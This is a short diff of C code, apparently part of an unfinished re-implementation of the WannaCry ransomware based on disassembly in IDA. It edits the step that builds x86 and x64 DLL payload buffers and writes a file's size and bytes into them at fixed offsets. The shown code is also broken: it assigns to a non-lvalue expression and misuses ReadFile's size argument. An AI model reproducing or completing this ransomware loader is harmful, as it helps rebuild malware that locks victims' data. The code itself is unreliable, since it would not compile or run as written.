@@ -3,8 +3,8 @@
 //still a work in progress
 
 //EXE file global here
-HGLOBAL hDLL_x86;
-HGLOBAL hDLL_x64;
+volatile HGLOBAL hDLL_x86;
+volatile HGLOBAL hDLL_x64;
 
 //init the DLL payload here
 //read from Wannacry in IDA
@@ -37,8 +37,8 @@ HGLOBAL initialize_payload()
 			fileSize = GetFileSize(fileHandle, NULL);
 			*(DWORD*)hDLL_x86 + 0x4060 = fileSize; //Dword length written in x86 DLL buffer
 			*(DWORD*)hDLL_x64 + 0xc8a4 = fileSize; //Dword length written in x64 DLL buffer
-			ReadFile(fileHandle, hDLL_x86 + 0x4060 + 4, &fileSize, &NumberOfBytesRead, 0);
-			ReadFile(fileHandle, hDLL_x64 + 0xc8a4 + 4, &fileSize, &NumberOfBytesRead, 0);
+			ReadFile(fileHandle, hDLL_x86 + 0x4060 + sizeof(DWORD), &fileSize, &NumberOfBytesRead, 0);
+			ReadFile(fileHandle, hDLL_x64 + 0xc8a4 + sizeof(DWORD), &fileSize, &NumberOfBytesRead, 0);
     			CloseHandle(fileHandle);
 		}
 	}
